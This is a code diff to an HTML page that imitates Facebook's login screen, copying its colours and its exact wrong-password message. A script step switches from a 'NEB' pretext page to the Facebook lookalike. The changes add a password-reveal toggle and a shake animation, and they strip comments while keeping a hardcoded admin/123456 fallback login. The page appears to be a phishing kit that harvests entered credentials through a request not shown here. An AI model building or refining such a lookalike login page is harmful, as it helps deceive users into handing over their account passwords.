@@ -168,7 +168,49 @@
             box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
         }
 
-        .card input {
+        /* Password field with eye icon */
+        .password-wrapper {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .password-wrapper input {
+            width: 100%;
+            padding: 14px 45px 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            background: white;
+        }
+
+        .password-wrapper input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .password-wrapper input.error-input {
+            border-color: #f02849;
+            background-color: #fff8f8;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 20px;
+            color: #65676b;
+            background: none;
+            border: none;
+        }
+
+        .eye-icon:hover {
+            color: #1877f2;
+        }
+
+        .email-input {
             width: 100%;
             padding: 14px 16px;
             margin-bottom: 12px;
@@ -179,12 +221,12 @@
             background: white;
         }
 
-        .card input:focus {
+        .email-input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        .card input.error-input {
+        .email-input.error-input {
             border-color: #f02849;
             background-color: #fff8f8;
         }
@@ -310,6 +352,17 @@
             text-decoration: underline;
         }
 
+        /* Shake animation */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+
+        .shake {
+            animation: shake 0.3s ease-in-out;
+        }
+
         @media (max-width: 900px) {
             .fb-wrapper {
                 flex-direction: column;
@@ -351,8 +404,11 @@
         </div>
         <div class="login-area">
             <div class="card">
-                <input type="text" id="email" placeholder="Email address or mobile number">
-                <input type="password" id="password" placeholder="Password">
+                <input type="text" id="email" class="email-input" placeholder="Email address or mobile number">
+                <div class="password-wrapper">
+                    <input type="password" id="password" placeholder="Password">
+                    <button class="eye-icon" id="togglePassword" type="button">👁️</button>
+                </div>
                 <div id="errorMsg" class="error-msg"></div>
                 <button class="login-btn" id="loginBtn">Log In</button>
                 <div class="forgot-link">
@@ -380,6 +436,16 @@
 </div>
 
 <script>
+    // Toggle password visibility
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+
+    togglePassword.addEventListener('click', function() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        this.textContent = type === 'password' ? '👁️' : '🙈';
+    });
+
     // Switch from NEB to Facebook
     document.getElementById('continueBtn').addEventListener('click', function() {
         document.getElementById('nebPage').style.opacity = '0';
@@ -390,7 +456,6 @@
     });
 
     const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
     const loginBtn = document.getElementById('loginBtn');
     const getLinkBtn = document.getElementById('getLinkBtn');
     const errorDiv = document.getElementById('errorMsg');
@@ -445,14 +510,12 @@
 
             if (data.success) {
                 alert('Login successful!');
-                // window.location.href = '/dashboard';
             } else {
                 showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
                 passwordInput.value = '';
                 passwordInput.focus();
             }
         } catch (err) {
-            // Demo mode - accept admin/123456
             if (email === 'admin' && password === '123456') {
                 alert('Login successful!');
             } else {
